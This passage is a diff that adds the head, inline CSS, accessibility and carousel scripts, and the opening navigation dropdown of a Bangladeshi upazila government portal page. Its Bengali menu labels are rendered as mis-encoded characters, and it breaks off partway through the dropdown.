@@ -1,0 +1,4372 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="stylesheet" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/css/youtube-video-gallery.css">
+    
+    <link rel="stylesheet" href="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/css/meganizr.css">
+    
+    <!-- Biggapon  CSS Start -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.css" integrity="sha512-X/RSQYxFb/tvuz6aNRTfKXDnQzmnzoawgEQ4X8nZNftzs8KFFH23p/BA6D2k0QCM4R0sY1DEy9MIY9b3fwi+bg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Biggapon  CSS End -->
+    
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <link href="//fonts.googleapis.com/css2?family=Hind+Siliguri:wght@600&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/css/responsive.css">
+    <script src="//code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"></script>
+    <script src="//cdn.jsdelivr.net/npm/jquery-cascading-dropdown@1.2.9/dist/jquery.cascadingdropdown.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" crossorigin="anonymous"></script>
+    <script src="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/js/simple-ticker.js" crossorigin="anonymous"></script>
+    <script src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/js/responsiveslides.min.js" crossorigin="anonymous"></script>
+    <script src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/js/jquery.youtubevideogallery.js" crossorigin="anonymous"></script>
+    <script src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/js/app.js" crossorigin="anonymous"></script>
+    
+    <!-- Online Polling -->
+    <script src="//polling.portal.gov.bd/js/npop.script.js" defer></script>
+    <!-- Comment Management Tools -->
+    <script src="//polling.portal.gov.bd/js/npc.script.js" defer></script>
+
+    <!-- userway accessibility start -->
+    <!-- <script type="text/javascript">
+        var _userway_config = {
+        account: "xyS2BuGIbM"
+        };
+    </script>
+    <script type="text/javascript" src="//cdn.userway.org/widget.js"></script> -->
+    <!-- userway accessibility end -->
+    
+    <!-- custom accessibility start -->
+    <link rel="stylesheet" href="//file.portal.gov.bd/media/central/accessibility/css/asb.css">
+    <script src="//file.portal.gov.bd/media/central/accessibility/js/asb.js" type="text/javascript"></script>
+    <!-- accessibility active issues -->
+     
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  
+  
+    <script>
+        document.addEventListener('keyup', (event) => {
+          //var name = event.key; //var code = event.code;
+          if (event.code === "Tab") {
+              var k = 0;
+              if (event.shiftKey) {
+                  //shift+tab pressed//Code // console.log(event.target);
+                  var activeElement = document.activeElement;
+                  if (activeElement.tagName.toLowerCase() == 'button'){
+                    if(activeElement.title === 'Download Screen Reader'){
+                      $('#myModalClose').attr('id', 'myModal');
+                      $('#myModal').modal();
+                      return false;
+                    }
+                  }
+              } else {
+                  //only tab pressed //Code
+              }
+            }
+          
+        });
+        
+        //====================//
+        // Add event listener on keydown
+        var access = 0;
+        if(access === 0){
+            document.addEventListener('keyup', (event) => {
+              var name = event.key;
+              var code = event.code;
+              var i = 0;
+              if(code == "Tab" && i == 0){
+                  $('#myModal').modal();
+                  i = i + 1;
+              }
+              // Alert the key name and key code on keydown
+            });
+            var accessibilitypop = document.querySelector('#accessibilitypop');
+            function accessibility(){
+                  $('#myModal').modal('hide');
+                  document.getElementById("universalAccessBtn").click();
+                  $('#myModal').attr('id', 'myModalClose');
+                  //$('#accessibilityBar').attr('class', 'active');
+                  $('#myModal').attr('tabindex', '');
+                  document.getElementById("universalAccessBtn").focus();
+                  $('#accessibilityBar').attr('role', 'dialog');
+                  $('#universalAccessBtn').attr('tabindex', '1');
+            };
+            
+            function accessibilitySkipToMainContent(){
+                  $('#myModal').attr('tabindex', '');
+                  $('#myModal').attr('id', 'myModalClose');
+                  //$('#notice-board-bg').attr({'aria-selected': true, 'tabindex': 0});
+                  //document.getElementById("notice-board-bg").focus();
+                  $('#skip-main-content-start-here').attr({'aria-selected': true, 'tabindex': 0});
+                  document.getElementById("skip-main-content-start-here").focus();
+            }
+            
+            function accessibilitymodelClose(){
+                  //$('#notice-board-bg').attr('tabindex', '0');
+                  $('#skip-main-content-start-here').attr('tabindex', '0');
+                  $('#myModal').attr('tabindex', '');
+                  $('#myModal').attr('id', 'myModalClose');
+            }
+        
+        }
+    </script>
+    <!-- end accessibility active issues -->
+    <!-- <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css" />
+    <script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/js/all.min.js"></script> -->
+    <!-- custom accessibility end -->
+    
+    <!-- Biggapon Js Start -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.js" integrity="sha512-9CWGXFSJ+/X0LWzSRCZFsOPhSfm6jbnL+Mpqo0o8Ke2SYr8rCTqb4/wGm+9n13HtDE1NQpAEOrMecDZw4FXQGg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        $(document).ready(function(){
+          $(".npsylhet_ad").owlCarousel({
+            items: 1,
+            autoPlay: true,
+            autoplayTimeout: 4000,
+            loop: true
+        });
+        });
+    </script>
+    <!-- Biggapon Js End -->  
+    
+    <style>
+    @media print{
+        .right{
+            display: none!important;    
+        }
+    }
+    </style>
+
+   <!--  <title>ansarvdp.shariakandi.bogra.gov.bd</title> -->
+   <title>   </title>
+   <!-- <link rel="icon" href="//cdn.sylhet.gov.bd/media/central/themes/default/img/favicon.ico" type="image/x-icon"> -->
+   
+            <link rel="icon" href="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/logo.png" type="image/x-icon">
+     
+
+    <style type="text/css" media="screen">
+        @font-face {
+          font-family: "kalpurushregular";
+          src: url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/fonts/Kalpurush.eot");
+          src: url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/fonts/Kalpurush.woff") format("woff"),
+            url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/fonts/Kalpurush.ttf") format("truetype"),
+            url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/fonts/Kalpurush.svg#Kalpurush") format("svg"),
+            url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/fonts/Kalpurush.eot?#iefix") format("embedded-opentype");
+          font-weight: normal;
+          font-style: normal;
+        }
+        
+        .text-green{color:limegreen}
+
+body {
+  font-family: kalpurushregular;
+  margin: 0;
+  font-weight: 400;
+  line-height: 1.5;
+  text-align: left;
+  background-color: #fff;
+  font-size: 16px;
+  color: #000;
+}
+
+video {
+    width: 100%
+}
+
+#left-content ul {
+  list-style: disc;
+}
+
+ul,
+ol {
+  margin-bottom: 20px;
+}
+
+li {
+  line-height: 18px;
+  margin-bottom: 12px;
+}
+
+h5 {
+  font-size: 17px;
+  line-height: 24px;
+}
+
+
+
+html,
+body,
+div,
+span,
+applet,
+object,
+iframe,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+p,
+blockquote,
+pre,
+a,
+abbr,
+acronym,
+address,
+big,
+cite,
+code,
+del,
+dfn,
+em,
+img,
+ins,
+kbd,
+q,
+s,
+samp,
+small,
+strike,
+strong,
+sub,
+sup,
+tt,
+var,
+b,
+u,
+i,
+center,
+dl,
+dt,
+dd,
+ol,
+ul,
+li,
+fieldset,
+form,
+label,
+legend,
+table,
+caption,
+tbody,
+tfoot,
+thead,
+tr,
+th,
+td,
+article,
+aside,
+canvas,
+details,
+embed,
+figure,
+figcaption,
+footer,
+header,
+hgroup,
+menu,
+nav,
+output,
+ruby,
+section,
+summary,
+time,
+mark,
+audio,
+video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+   
+  vertical-align: baseline;
+}
+
+a,
+a:visited {
+  color: #333;
+  text-decoration: none;
+  outline: 0;
+}
+
+#logo img {
+    display: block;
+    width: 70px;
+    height: auto;
+}
+
+.right {
+  float: right;
+}
+
+.btn-nb {
+    background-image: linear-gradient(to bottom, #666, #a6a6a6);
+    background-repeat: repeat-x;
+    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #a2a2a2;
+    padding: 0 5px;
+    color: #ffffff;
+    background-color: #a6a6a6;
+}
+
+.btn-right {
+    float: right;
+    /* padding: 0 5px; */
+    color: #ffffff;
+    margin: 15px -35px 0px 0px;
+}
+
+.blue {
+    color: blue;
+}
+.white {
+    color: white!important;
+}
+
+#contents .block {
+  overflow: hidden;
+  width: 100%;
+}
+
+.block {
+  margin-bottom: 10px;
+  font-size: 13px;
+}
+
+.right-side-bar .block img {
+  margin: 0 5px 0 0;
+}
+
+.right-side-bar {
+    padding-top: 0px;
+}
+
+.ul-none{
+    list-style: none;
+}
+
+/* .right-side-bar .block ul li {
+    border-bottom: 1px solid transparent;
+    border-image: linear-gradient(to right,#683091 0%, #8bc643 100%);
+    border-image-slice: 1;
+    background-position: left;    
+    font-size: 120%;
+    height: auto;
+    list-style-type: none;
+    margin-bottom: 5px;
+    padding-left: 32px;
+    padding-top: 0px;
+    padding-bottom: 8px;
+} */
+
+.service-row {
+  margin-bottom: 20px;
+  /* margin-top: 20px; */
+}
+
+.block .title {
+  padding: 5px;
+  font-size: 1.2em;
+  background-color: #609513;
+  color: #fff;
+  line-height: 24px;
+}
+
+.block table td {
+  box-sizing: border-box;
+  padding: 5px;
+  border: 1px solid #d8d8d8;
+}
+
+.block h5 {
+  font-weight: bold;
+  margin-bottom: 10px;
+  font-size: inherit;
+}
+
+.job-block {
+  margin-bottom: 10px;
+}
+
+.job-block .apply-online {
+  border-bottom-style: solid;
+  border-bottom-width: 5px;
+  color: #ffffff;
+  font-size: 15px;
+  line-height: 1.2;
+  margin-bottom: 10px;
+  padding-bottom: 15px;
+  padding-top: 15px;
+  text-align: center;
+}
+
+.job-block .apply-online a {
+  color: #683091;
+  text-decoration: none;
+}
+
+sup {
+  font-size: xx-small;
+  vertical-align: super;
+}
+
+.service-list > h5 {
+  padding: 5px;
+  font-size: 1.2em;
+  overflow: hidden;
+}
+.service-list > ul {
+  padding: 10px 0;
+  margin: 0;
+}
+
+.service-list .title {
+  font-weight: bold;
+  margin-bottom: 10px;
+  background-attachment: scroll;
+  background-clip: border-box;
+  background-origin: padding-box;
+  background-position-x: 0px;
+  background-position-y: 0px;
+  background-repeat: no-repeat;
+  background-size: cover;
+  margin-top: 0;
+  padding-left: 45px !important;
+  border: 1px solid #ccc;
+  color: #683091;
+  line-height: 30px
+}
+
+.service-list ul li {
+  background-position: left;
+
+  font-size: 120%;
+  height: auto;
+  list-style-type: none;
+  margin-bottom: 5px;
+  padding-left: 2px;
+  padding-top: 0px;
+  padding-bottom: 8px;
+  line-height: 18px;
+}
+
+.service-list ul li a {
+  font-size: 16px;
+  text-decoration: none;
+}
+
+.service-list > h5 {
+    padding: 5px;
+    font-size: 1.2em;
+}
+
+.social img {
+  margin: 0 5px 0 0;
+  width: 30px;
+}
+
+.footer-wrapper {
+  background-color: #ebebeb;
+  height: 100px;
+  margin: 0 auto;
+}
+
+.footer-menu {
+  display: flex;
+  justify-content: space-between;
+  padding: 15px;
+}
+
+#footer-menu {
+  padding: 10px 20px 0px 10px;
+}
+
+#footer p{
+        float: none;
+    }
+
+.footer-menu .last-update {
+  font-size: 0.9em;
+}
+
+.footer-menu .last-update .date {
+  font-style: italic;
+}
+
+.footer-credit {
+  float: right;
+  font-size: 0.8em;
+  text-align: right;
+  padding: 0px 20px 0px 10px;
+}
+.list .title {
+    padding: 15px 0;
+    font-size: 24px;
+}
+.list .pagination li {
+    margin-right: 10px;    
+}
+
+.list .pagination .disabled {
+    color: #ccc
+}
+.list table td {
+    padding: 10px;
+}
+.details {
+    padding: 20px 0;
+}
+
+.control-file img {
+    height: 15px;
+    width: 15px;
+}
+table.content-type-list td[scope='row'] {
+    white-space: nowrap;
+}
+
+.box {
+    background-color: #f5f5f5;
+    border: 1px solid #ccc;
+}
+
+.list > li {
+    padding: 5px 0;
+    margin: 0;
+}
+
+
+.ticker {
+  /* margin: 0 auto;
+  padding: 10px;
+  width: 600px;
+  text-align: left;
+  border: #ccc 1px solid;
+  position: relative;
+  overflow: hidden;
+  background-color:#ffffff; */
+}
+
+.ticker ul {
+  width: 100%;
+  position: relative;
+}
+
+.ticker ul li {
+  width: 100%;
+  display: none;
+}
+
+.details-page .label {font-weight:bold}
+
+/*for video gallary*/
+.close a{float: right;color: #fff}
+.close {float: none}
+
+/* details page */
+
+.details-page .title .value {font-size:20px;margin-bottom:10px;border-bottom:1px solid lightgray;}
+
+@media print{
+    #top {
+    display: none !important;
+}
+}
+
+@media only screen and (min-width:320px) and (max-width:959px){
+    .footer-credit {
+            margin: 10px 0px 0 0px !important;
+            float: left!important;
+            width: 99%;
+            text-align: left!important;
+        }
+    .footer-wrapper {
+      float: left;
+      height: auto;
+      width: 100%;
+      overflow: hidden;
+      padding: 0px 0px 20px 0px;
+    }
+    .service-box{
+        margin-bottom: 20px;
+    }
+    .service-row{
+        margin-bottom: 0px;
+    }
+    .footer-artwork {
+		height: 15px;
+		margin: 0 auto;
+		background-color: #666;
+	}
+	.service-list .title {
+	    padding-left: 60px !important;
+	    line-height: 35px;
+        padding-top: 10px;
+        padding-bottom: 10px;
+	}
+}
+@media only screen and (min-width: 960px) {
+    .footer-artwork {      
+      height: 84px;
+      margin: 0 auto;
+      clear: both;
+    }
+    .footer-wrapper {
+        width: 100%;
+    }
+    #footer p br { 
+       display: none;
+    }
+}
+
+.html_text a { color: blue !important; }
+
+.content table tbody tr img {
+    height: 300px !important;
+}
+
+.card-horizontal img {
+    max-width: 100%!important;
+    height: 300px!important;
+    /* height: 300px ; */
+}
+/* Ch Bappy UY Systems Code Start */
+
+.block table{
+    margin-left: 15px;
+    margin-top: 20px;
+}
+.block.job-block table {
+    margin-left: 0;
+}
+div#notice-board {
+    margin-top: 20px!important;
+}
+@media (max-width: 991px) {
+    #site-name a, #slogan {
+        margin-left: 30px!important;
+    } 
+    
+    #banner-slider {
+        display: block !important;
+    }
+    
+    #banner-slider img {
+        display: block !important;
+        width: 100% !important;
+        height: auto !important;
+    }
+    #logo{
+        display: block!important;
+    }
+    .container.details-page .row {
+        display: block !important;
+    }
+    
+    .right-side-bar.col-3 {
+        width: 100% !important;
+        max-width: 100% !important;
+    }
+    
+    .img-square-wrapper img {
+        margin-top: 0px!important;
+    }
+    
+    .block table{
+        margin-left: 0px;
+    }
+    
+        
+}
+@media (max-width: 767px) {
+    .img-square-wrapper img {
+        width: 100%;
+        margin-top: 50px;
+        
+    }
+    #header-site-info {
+        display: block !important;
+    }
+    #logo img{
+        width: 50px!important;
+    }
+    .plain-header{
+        display: none!important;
+    }
+    
+   #logo{
+        margin-top: 20px!important;  
+        margin-left: -14px!important;
+    }
+    
+    #site-name, #slogan {
+        margin-top: 14px !important;
+        
+    }
+    #site-name a, #slogan {
+        font-size: 25px !important;
+    }
+    .block table{
+        margin-left: 0px;
+    }
+    
+            
+}
+@media (max-width: 575px) {
+    
+    
+    #ad-slider .ad-slide-item {
+        width: 95%!important;
+    }
+    .right-side-bar .block img{
+        width: 95%;
+        height: auto;
+    }
+    
+    #site-name-wrapper #site-name {
+        display: block !important;
+        margin: 14px 25px 0px !important;
+    } 
+    .service-box img{
+        width: 25% !important;
+    }
+    .block table{
+        margin-left: 0px;
+    }
+    #site-name a, #slogan {
+        font-size: 16px !important;
+    }
+    
+    .block .content table iframe {
+        width: 95% !important;
+    }
+    
+    .block .content iframe {
+        width: 98%!important;
+    }
+    
+}
+
+
+
+@media (max-width: 320px) {
+    iframe {
+        display: none;
+        width: 100%;
+    }
+    .card-horizontal {
+        display: block!important;
+    }
+    
+    .img-square-wrapper img {
+        margin-top: 10px!important;
+    }
+    .content table tbody tr img {
+        display: block;
+        height: 100px !important;
+    }
+    
+    iframe {
+    
+        display: block!important;
+        width: 100%;
+    
+    }
+    .table-responsive.officer-table .info_officer_img {
+        display: none !important;
+    }
+    .block table{
+        margin-left: 0px;
+    }
+    
+    .content table {
+        width: 289px !important;
+        /* display: none; */
+    }
+    
+          
+    
+}
+
+.value img {
+   /*  display: block; */
+    /* width: 100%!important; */
+    max-width: 1040px;
+}
+.image .value {
+   text-align: center;
+
+}
+.content table {
+    width: 100% !important;
+}
+
+ .menu a{
+    padding: 11px 7px!important;
+} 
+
+.html_text.body table, tr, td {
+    border: 1px solid #333!important;
+}
+
+table.table.table-bordered, tr, td, th {
+    border: 1px solid #000!important;
+}
+
+.label {
+    display: inline;
+    padding: 0px!important;
+    font-size: 75%;
+    font-weight: 700;
+    line-height: 1;
+    color: #000;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: baseline;
+    border-radius: 0.25em;
+}
+
+
+/* .print_btn{
+        display: none!important;
+    } */
+@media print {
+    .print_btn{
+        display: none!important;
+    }
+    #top{
+        display: none!important;
+    }
+    .footer-artwork, #footer-wrapper, #footer-menu  {
+      display: none!important;
+    }
+    #footer-menu, #footer-credit{
+        display: none;
+        }
+        #footer-credit p{
+        display: none;
+        }
+        .top-menu{
+            display: none!important;
+        }
+}
+
+/* --- Start Social Share --- */
+
+.social_btn{
+  color: #fff !important;
+  padding: 5px;
+  font-size: 12px;
+  width: 24px;
+  height: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 50%;
+  transition: all 0.6s ease;
+}
+.social_btn:hover{
+  transform: translateY(-4px);
+}
+/* Social Icon */
+.bread_social{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.facebook{
+  background: #303F9E;
+}
+.twitter{
+  background: #3675AE;
+}
+.viber{
+  background: #9D1BC0;
+}
+.twitter {
+  background: #3675AE;
+}
+.whatsapp {
+  background: #6FBE3C;
+}
+.linkedin {
+  background: #3874B2;
+}
+.link {
+  background: #4FB2E2;
+}
+.messenger {
+  background: #BF3DC8;
+}
+
+.share-popup {  
+  display: none;
+	position: absolute;
+  bottom: 3px;
+  left: 16px;
+  background-color: white;
+  /* border: 1px solid var(--globalColor); */
+  border-radius: 5px;
+  padding: 7px;
+  box-shadow: 0 0px 25px rgb(0 0 0 / 0.4);
+  z-index: 100000000000000000000000000;
+}
+
+.share-icon:hover+#share-popup,
+.share-popup.active {
+  /* display: block; */
+  display: flex;
+  position: absolute;
+  z-index: 100000000000000000000000000;
+}
+
+@media (max-width: 767px) {
+  .bread_social{
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+  }
+  .webform{
+    display: flex;
+    flex-direction: column;
+  }
+  .webform iframe{
+    margin: 5px;
+  }
+  .webform .body{
+    width: 100%;
+  }
+}
+
+/* --- End Social Share --- */
+        
+        /*.right-side-bar .block ul li {
+            background: url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/bg_block_list.png") no-repeat scroll 0 0 rgba(0, 0, 0, 0);
+        }*/
+        
+        @media only screen and (min-width: 960px) {
+        	body{
+        		background: url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/bg_main.gif") repeat-y scroll center top rgba(0, 0, 0, 0);
+        	}
+        	.container {
+        	    position: relative;
+                width: 960px;
+                margin: 0 auto;
+                padding: 0;
+        	}
+        	.footer-artwork {
+        	    background: url("//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/footer_top_bg.png") no-repeat scroll 0 0 rgba(0, 0, 0, 0);
+        	}
+        }
+        
+        
+        
+        /*==================================
+         Content share css design
+        ===================================*/
+        .share-text-style{
+            font-family: 'Hind Siliguri';
+            color: #662D91!important;
+            font-size: 12px;
+        }
+        .share-title{
+            font-family: 'Hind Siliguri';
+            color: #662D91;
+            font-size: 17px;
+            margin-right: 4px;
+            text-align: right;
+        }
+        .share-youtube-title{
+            font-family: 'Hind Siliguri';
+            color: #2E2E2E;
+            font-size: 9px;
+            letter-spacing: 0px;
+        }
+        .share-content-box{
+            display: flex;
+            justify-content: end;
+            gap: 16px;
+            text-align: center;
+            align-items: end;
+        }
+        .at4-jumboshare .at4-count-container {
+            min-width: 30px!important;
+            padding-right: 0px!important;
+        }
+        .at4-jumboshare .at4-count{
+            padding-left: 0px!important;
+            padding-right: 0px!important;
+            font-size: 0!important;
+            line-height: 0!important;
+        }
+        .at4-jumboshare .at4-share-container {
+            padding-left: 10px!important;
+        }
+        .at4-jumboshare table, .at4-jumboshare table tr, .at4-jumboshare td, .at4-jumboshare table th{
+            border:none !important;  
+        }
+        .at-svc-compact{
+            display:none !important;
+        }
+        
+        @media only screen and (max-width: 770px) {
+            .share-content-box {
+                gap: 5px;
+            }
+            .share-content-box img{
+                width: 15px!important;
+                height: 13px!important;
+            }
+            .share-content-box > div{
+                margin-right: 0px!important;
+            }
+            .share-text-style{
+                font-size: 9px;   
+            }
+            .at-mobile .at-resp-share-element .at-share-btn {
+                padding: 0px!important;
+                margin-right: 0px!important;
+            }
+            .share-title {
+                font-size: 10px;
+            }
+            .at4-jumboshare .at4-share-container {
+                padding-left: 3px!important;
+            }
+        }
+        
+        #accessibilityBar{
+            top:364px!important;;
+        }
+    </style>
+    <style>
+        /*Addthis print hide css*/
+        @media print {
+            .hide-for-print, #accessibilityBar, #onlinePollBlock, #onlineCommentBlock { display: none !important; }
+        }
+    </style>
+    <script>
+         var lang = "bn";
+     </script>
+  </head>
+  
+  <body class="theme-theme-default site-13485 ansarvdp.shariakandi.bogra.gov.bd">
+
+
+        <!-- accessibility Modal -->
+      <div class="modal fade" id="myModal" role="dialog" tabindex="-1">
+        <div class="modal-dialog text-center" >
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-body">
+              <button class="btn btn-default"  data-dismiss="modal" onclick="accessibilitySkipToMainContent()">Skip to main content</button>
+              <button class="btn btn-default" id="accessibilitypop" onclick="accessibility()">Go to accessibility menu</button>
+              <button class="btn btn-default"  type="button" class="close" data-dismiss="modal" onclick="accessibilitymodelClose()" title="close" alt="close">
+<i class="fa fa-close" style="font-size:18px"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    <!-- end accessibility Modal -->
+     <!--   -->
+      <div class="container details-page">
+        <div class="row" >
+            <div class="col">
+                <div id="top">
+                     <div class="blocks">
+            
+                    
+            <div class="top-menu">
+    <div class="row mb-2 mb-md-0">
+        <div id="start-np" autofocus="autofocus" style="opacity:0;font-size:1px;position: absolute;">Wellcome to National Portal</div>
+        <div class="col-8 col-md-3 bd-gov-site"><a href="http://www.bangladesh.gov.bd/" target="_blank" title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦œà¦¾à¦¤à§€à¦¯à¦¼ à¦¤à¦¥à§à¦¯ à¦¬à¦¾à¦¤à¦¾à¦¯à¦¼à¦¨">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦œà¦¾à¦¤à§€à¦¯à¦¼ à¦¤à¦¥à§à¦¯ à¦¬à¦¾à¦¤à¦¾à¦¯à¦¼à¦¨</a></div>
+        <div class="d-none d-md-block col-md-8 middle-form" id="sitesDropdown">
+            <div class="form-item">
+                <select title="à¦¬à¦¿à¦­à¦¾à¦— à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à¦¤à§‡ à¦à¦–à¦¾à¦¨à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à§à¦¨" class="chzn-select doptors mt-2 mt-md-0" id="doptor">
+				    <option>---</option>
+                    <option value="alldiv">à¦¬à¦¿à¦­à¦¾à¦— </option>
+                    <!-- <option>à¦¦à¦ªà§à¦¤à¦° à¦¸à¦®à§‚à¦¹ </option> -->
+
+                                        
+                    <option value="2">
+                                        à¦¦à¦ªà§à¦¤à¦° à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹
+                        <!-- à¦¦à¦ªà§à¦¤à¦° à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹ -->
+                    </option>
+                    
+                                        
+                    <option value="4">
+                                        à¦¬à¦¿à¦­à¦¾à¦— à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- Divisional Govt. Office -->
+                    </option>
+                    
+                                        
+                    <option value="5">
+                                        à¦œà§‡à¦²à¦¾ à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- District Govt. Office -->
+                    </option>
+                    
+                                        
+                    <option value="6">
+                                        à¦‰à¦ªà¦œà§‡à¦²à¦¾ à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- Upazila Level Govt. Office -->
+                    </option>
+                    
+                                        
+                    <option value="7">
+                                        à¦†à¦žà§à¦šà¦²à¦¿à¦• à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹
+                        <!-- Union Govt. Office -->
+                    </option>
+                    
+                                    </select>
+
+                <select title="" class="chzn-select doptors d-none mt-2 mt-md-0" id="first_level"></select>
+                <select title="" class="chzn-select doptors d-none mt-2 mt-md-0" id="second_level"></select>
+                <select title="" class="chzn-select doptors d-none mt-2 mt-md-0" id="third_level"></select>
+                <select title="" class="chzn-select doptors d-none mt-2 mt-md-0" id="forth_level"></select>
+
+                <button class="btn btn-primary btn-sm" id="doptor_navigation_go">Go</button>
+
+            </div>
+        </div>
+        <div class="col-4 col-md-1">
+            <!-- <button id="lang-btn" class="btn btn-primary btn-sm float-right">English</button> -->
+            <select class="custom-select rounded " id="lang-switcher">
+                                    <option value="bn" selected>Bangla</option>
+                                    <option value="en" >English</option>
+                            </select>
+        </div>
+        
+    </div>
+    <div class="another_portal d-none">
+        <a href="javascript:;" class="show-menu" id="mob_navigation" title="à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦¨à§à¦¯à¦¾à¦¨à§à¦¯ à¦ªà§‹à¦°à§à¦Ÿà¦¾à¦² à¦¦à§‡à¦–à§à¦¨">
+        
+        <i class="fas fa-bars" style="background-color:#683091;"></i>
+        <span style="margin-left:10px;"> à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦¨à§à¦¯à¦¾à¦¨à§à¦¯ à¦ªà§‹à¦°à§à¦Ÿà¦¾à¦² à¦¦à§‡à¦–à§à¦¨   </span>
+        </a>
+    </div>
+    <div class="portal_cont">
+        <div class="form-item">
+            <select title="à¦¬à¦¿à¦­à¦¾à¦— à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à¦¤à§‡ à¦à¦–à¦¾à¦¨à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à§à¦¨" class="chzn-select doptors mb-2" id="mob_doptor">
+
+                <option value="alldiv">à¦¬à¦¿à¦­à¦¾à¦— </option>
+
+                                    <option value="2">
+                                        à¦¦à¦ªà§à¦¤à¦° à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹
+                        <!-- à¦¦à¦ªà§à¦¤à¦° à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹ -->
+                    </option>
+                <!-- <option value="2">à¦¦à¦ªà§à¦¤à¦° à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹</option> -->
+
+                                    <option value="4">
+                                        à¦¬à¦¿à¦­à¦¾à¦— à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- Divisional Govt. Office -->
+                    </option>
+                <!-- <option value="4">Divisional Govt. Office</option> -->
+
+                                    <option value="5">
+                                        à¦œà§‡à¦²à¦¾ à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- District Govt. Office -->
+                    </option>
+                <!-- <option value="5">District Govt. Office</option> -->
+
+                                    <option value="6">
